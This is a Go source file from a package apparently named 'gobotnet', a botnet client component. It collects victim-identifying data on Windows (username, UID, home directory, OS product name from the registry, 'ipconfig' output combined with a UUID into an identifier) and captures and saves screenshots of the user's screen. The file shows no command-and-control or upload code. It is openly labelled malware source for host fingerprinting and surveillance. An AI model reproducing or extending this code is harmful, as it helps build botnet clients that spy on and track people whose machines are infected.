package gobotnet

import (
	//"encoding/base64"
	"fmt"
	"github.com/satori/go.uuid"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows/registry"
	"image"
	"image/png"
	"os"
	"os/user"
)

func CmdTest() {
	fmt.Println("test prgCmd")
	// fmt.Println(getName())
	//fmt.Println(getOS())
	// fmt.Println(getUid())
	// fmt.Println(getUsername())
	// fmt.Println(getHomeDir())
	//fmt.Println(base64.StdEncoding.EncodeToString([]byte(getIdentificator())))
	image := getScreenshot()
	SaveImageToFile(image, "1.png")

}

func getUsername() string {
	usr, _ := user.Current()
	return usr.Username
}

func getIdentificator() string {
	ipConfigOut, _ := CmdExec("ipconfig")
	return uuid.NewV4().String() + getUsername() + string(ipConfigOut)
}

func getUid() string {
	usr, _ := user.Current()
	return usr.Uid
}

func getHomeDir() string {
	usr, _ := user.Current()
	return usr.HomeDir
}

func getName() string {
	usr, _ := user.Current()
	return usr.Name
}

func getOS() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, registry.READ)
	if err != nil {
		return ""
	}
	value, _, err := key.GetStringValue("ProductName")
	if err != nil {
		return ""
	}
	return value
}

func getScreenshot() *image.RGBA {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		OutMessage(err.Error())
	}
	return img
}

func SaveImageToFile(image *image.RGBA, nameFile string) error {
	f, err := os.Create("./" + nameFile)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	err = png.Encode(f, image)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	f.Close()
	return nil
}
